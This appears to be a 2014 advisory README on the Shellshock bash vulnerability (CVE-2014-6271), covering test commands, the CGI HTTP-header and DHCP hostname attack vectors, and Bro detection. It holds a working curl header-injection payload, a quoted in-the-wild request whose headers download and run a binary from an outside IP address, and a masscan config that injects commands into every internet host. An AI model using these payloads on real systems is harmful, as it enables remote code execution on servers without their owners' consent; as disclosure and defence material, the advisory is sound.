CVE-2014-6271
===

For up-to-date information on this vulnerability as this situation evolves make sure to to give us a follow on twitter: [@CriticalStack](https://twitter.com/criticalstack).  

Come see [@Hectaman](https://twitter.com/hectaman) speak this Sunday September 28, 2014 at 4:00 pm at [Derbycon 2014](https://www.derbycon.com/schedule/)
)


[1. Overview](#overview)

[2. HTTP Header](#httpheader)

[3. DHCP hostname](#dhcphostname)

[4. #koopa_troopa](#koopa_troopa)

[5. With great power...](#power)

[6. Misc vulns, detections & scripts](#misc)

[7. Thanks](#thanks)

<a name="overview"></a>
##1. Overview
===

[CVE-2014-6271](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271) is a real nasty one; this vulnerability is in one of those pervasive pieces of software that comes with nearly every unixy type device- the [bash](http://tiswww.case.edu/php/chet/bash/bashtop.html), the Bourne-Again SHell.  Let's test to see if your servers|workstations|internet-of-things is vulnerable:

Open a shell and paste:
```
env x='() { :;}; echo vulnerable' bash -c 'echo hello'
```

If you are not vulnerable, then the following will be shown:
```
bash: warning: x: ignoring function definition attempt
bash: error importing function definition for `x'
hello
```
If you are vulnerable, then you will see:
```
vulnerable
hello
```

If you are vulnerable you should update your device immediately.  I have a feeling that this is the kind of exploit that is going to start cropping up in a large variety of cases and other protocols. I'll try to keep this updated to detect the various methods as the situation evolves.

<a name="httpheader"></a>
##2. HTTP Header Attack
===


First POC is out- attempting to attack bash based cgi scripts; [internet wide scans](http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html) have been kicked off and I expect to see this genuinely weaponized before the evening is out. 

Let's explore what is happening a little further here; a vulnerable piece of code will look something like this:

```
#!/bin/bash

echo Content-type: text/html
echo ""

/bin/cat << EOM
<HTML>
<HEAD><TITLE>File Output: /home/user1/public_html/text-file.txt </TITLE>
</HEAD>
<BODY bgcolor="#cccccc" text="#000000">
<P>
<SMALL>
<PRE>
EOM

/bin/env

CAT << EOM
</PRE>
</SMALL>
<P>
</BODY>
</HTML>
EOM
```
[source](http://www.yolinux.com/TUTORIALS/LinuxTutorialCgiShellScript.html) 

This piece of code will output something like this:
```
<HTML>
<HEAD><TITLE>File Output: /home/user1/public_html/text-file.txt </TITLE>
</HEAD>
<BODY bgcolor="#cccccc" text="#000000">
<P>
<SMALL>
<PRE>
SERVER_SIGNATURE=
Apache/2.0.40 Server at localhost Port 80


UNIQUE_ID=DErk6n8AAAEAAAblFQEAAAAD
HTTP_USER_AGENT=Mozilla/4.8 [en] (X11; U; Linux 2.4.18-27.8.0 i586)
SERVER_PORT=80
HTTP_HOST=localhost
DOCUMENT_ROOT=/var/www/html
HTTP_ACCEPT_CHARSET=iso-8859-1,*,utf-8
SCRIPT_FILENAME=/var/www/cgi-bin/env.sh
REQUEST_URI=/cgi-bin/env.sh
SCRIPT_NAME=/cgi-bin/env.sh
HTTP_CONNECTION=Keep-Alive
REMOTE_PORT=32984
PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/X11R6/bin
PWD=/var/www/cgi-bin
SERVER_ADMIN=root@localhost
HTTP_ACCEPT_LANGUAGE=en
HTTP_ACCEPT=image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
REMOTE_ADDR=127.0.0.1
SHLVL=1
SERVER_NAME=localhost
SERVER_SOFTWARE=Apache/2.0.40 (Red Hat Linux)
QUERY_STRING=
SERVER_ADDR=127.0.0.1
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.0
HTTP_ACCEPT_ENCODING=gzip
REQUEST_METHOD=GET
_=/bin/env
</PRE>
</SMALL>
<P>
</BODY>
</HTML>
```

[mod_cgi](http://httpd.apache.org/docs/2.2/mod/mod_cgi.html) takes all of the HTTP header fields and passes them to the bash script as environment variables for execution.  And you know that the **remote** party, the *connection originator* controls all of the client headers...  Really this is as simple as just using curl:

```
curl -k -H 'User-Agent: () { :;}; /bin/ping -c1  XXX.XXX.XXX.XXX' http://127.0.0.1/cgi-bin/hi
``` 

And of course, you don't need to use a common field, such as the **user-agent**- any field will work!  So far we have not seen or been able to get a URL encoded version of this exploit to work- however, I expect to see significant "innovation" in this space.  More to come.


<a name="dhcphostname"></a>
##3. DHCP Hostname
===

The folks over at metasploit have been busy working on an exploit vector for DHCP for this vulnerability; [rcvalle](https://twitter.com/rcvalle) [added a module](https://github.com/rapid7/metasploit-framework/pull/3891) to targeting dhclient network configuration scripts through the HOSTNAME, DOMAINNAME, and URL DHCP options.

Taking a quick look at a sample attack on the hostname:
```
event dhcp_offer(c: connection, msg: dhcp_msg, mask: addr, router: dhcp_router_list, lease: interval, serv_addr: addr, host_name: string)
{
	print msg;
	print mask;
	print router;
	print lease;
	print serv_addr;
	print host_name;
	print "************";

}
```

Yields an output like this:
```
[op=2, m_type=2, xid=1663491967, h_addr=10:6f:3f:98:0f:bc, ciaddr=0.0.0.0, yiaddr=18.30.16.172]
255.255.255.0
{
[1] = 172.16.30.1
}
1.0 day
192.168.0.16
() { \0
************
```

I've updated the detector to support the DHCP hostname attack, however Bro's DHCP analyzer does not support the other edge cases.  Possible we can grab them with a signature.  More to follwo.

<a name="koopa_troopa"></a>
##4. #koopa_troopa aka #goomba (thanks [@mubix](https://twitter.com/mubix) )
===

So it didn't take long for the first of many exploits to break; earlier today this started circulating:

```
GET./.HTTP/1.0
.User-Agent:.Thanks-Rob
.Cookie:().{.:;.};.wget.-O./tmp/besh.http://162.253.66.76/nginx;.chmod.777./tmp/besh;./tmp/besh;
.Host:().{.:;.};.wget.-O./tmp/besh.http://162.253.66.76/nginx;.chmod.777./tmp/besh;./tmp/besh;
.Referer:().{.:;.};.wget.-O./tmp/besh.http://162.253.66.76/nginx;.chmod.777./tmp/besh;./tmp/besh;
.Accept:.*/*
 
$ file nginx 
nginx: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.18, stripped
 
$ md5sum nginx 
5924bcc045bb7039f55c6ce29234e29a  nginx
 
$ sha256sum nginx 
73b0d95541c84965fa42c3e257bb349957b3be626dec9d55efcc6ebcba6fa489  nginx
 
Looking at string variables, it appears to be a kernel exploit with a CnC component.
- found by @yinettesys
```

[Source](https://gist.github.com/anonymous/929d622f3b36b00c0be1)

Thanks to [@yinettesys](https://twitter.com/yinettesys) for sharing!


<a name="power"></a>
##5. With great power...
===


[Matt Kelley](https://twitter.com/breakersall) [jokes today](https://gist.github.com/anonymous/929d622f3b36b00c0be1) that he's that hoping someone man/womans up and becomes the Internet Fairy today:

```
#InfoSec good dead fairy
#Original from shellshock-scan (http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html)
target = 0.0.0.0/0
port = 80
banners = true
http-user-agent = InfosecFairy
http-header = Cookie:() { :; }; apt-get update -y; apt-get upgrade -y; yum update bash -y
http-header = Host:() { :; }; apt-get update -y; apt-get upgrade -y; yum update bash -y
http-header = Referer:() { :; }; apt-get update -y; apt-get upgrade -y; yum update bash -y
```

[Source](https://gist.github.com/breakersall/9f5250f76295626d6e12)

Hilarious- you can follow [Matt Kelley](https://twitter.com/breakersall) on the twitters.

:)


<a name="misc"></a>
##6. Misc vulns, detections & scripts
===

   * [@detectify](https://twitter.com/detectify) posted a scanner looking for common CGI's (expect this list to grow exponentially) [Detectify](https://docs.google.com/document/d/1vN2QOG2OZIAHGXDmd5wB8FPi-Hin2GaIlWRJ0RYkTbA/preview?sle=true)

   * [@remor](https://twitter.com/remor) released a cool detection that also looks for 2nd stage payloads over at [@broala_](https://twitter.com/broala_); find it here: [bro-shellshock](https://github.com/broala/bro-shellshock)

<a name="thanks"></a>
##7. Thanks
===

Thanks to [@hackerplaybook](https://twitter.com/hackerplaybook) for the help testing.  Give him (and Me- [@Hectaman](https://twitter.com/hectaman)) a follow!

Thanks to [Matt Kelley](https://twitter.com/breakersall) for the lulz.

Thanks to [@yinettesys](https://twitter.com/yinettesys) for being the first spotter!